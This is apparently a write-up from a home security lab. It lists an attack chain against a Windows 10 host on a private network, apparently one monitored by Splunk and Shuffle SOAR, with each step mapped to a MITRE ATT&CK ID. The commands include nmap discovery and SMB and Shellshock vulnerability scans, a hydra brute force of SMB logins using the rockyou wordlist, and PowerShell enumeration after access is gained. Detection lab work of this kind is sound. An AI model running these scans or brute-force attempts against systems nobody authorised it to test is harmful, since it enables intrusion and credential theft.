# Attack Commands — Full Attack Chain

**Attacker Machine:** Kali Linux
**Target Machine:** Windows 10 (DESKTOP-DDM3ULB) — 192.168.1.16
**Date:** March 9, 2026

---

## Phase 1 — Host Discovery
```bash
nmap -sn 192.168.1.0/24
```
**Purpose:** Discover all live hosts on the network
**Result:** Found DESKTOP-DDM3ULB at 192.168.1.16
**MITRE:** T1046

---

## Phase 2 — Full Port and Service Scan
```bash
nmap -sV -sC -O 192.168.1.16
```
**Purpose:** Identify open ports, services and OS
**Result:** 8 open ports discovered including SMB, Splunk, OpenSearch
**MITRE:** T1046

---

## Phase 3 — Aggressive Scan
```bash
nmap -A -T4 192.168.1.16
```
**Purpose:** Aggressive scan with OS detection and scripts
**Result:** Full service fingerprinting completed
**MITRE:** T1046

---

## Phase 4 — SMB Vulnerability Scan
```bash
nmap -sV --script smb-vuln* 192.168.1.16
```
**Purpose:** Check for SMB vulnerabilities
**Result:** SMB signing enabled but not required
**MITRE:** T1210

---

## Phase 5 — HTTP Shellshock Probe
```bash
nmap --script http-shellshock 192.168.1.16
```
**Purpose:** Test for Shellshock vulnerability on HTTP services
**Result:** No Shellshock vulnerability found
**MITRE:** T1190

---

## Phase 6 — Brute Force Attack
```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt 192.168.1.16 smb
```
**Purpose:** Brute force SMB authentication
**Result:** 14,344,399 password attempts executed
**MITRE:** T1110

---

## Phase 7 — Post Exploitation Discovery
Run on Windows target PowerShell:
```powershell
whoami /priv
net user
net localgroup administrators
ipconfig /all
systeminfo
```
**Purpose:** Enumerate system info, users and privileges
**Result:** Full system reconnaissance completed
**MITRE:** T1082, T1087, T1016, T1069

---

## Open Ports Discovered
| Port | Service | Version |
|---|---|---|
| 135 | Windows RPC | Microsoft Windows RPC |
| 139 | NetBIOS | Microsoft Windows NetBIOS |
| 445 | SMB | Microsoft DS |
| 3001 | HTTP | Nginx (Shuffle SOAR) |
| 5001 | HTTP | Golang (Shuffle Backend) |
| 8000 | HTTP | Splunk httpd |
| 8089 | SSL/HTTP | Splunk httpd |
| 9200 | SSL | OpenSearch 3.2.0 |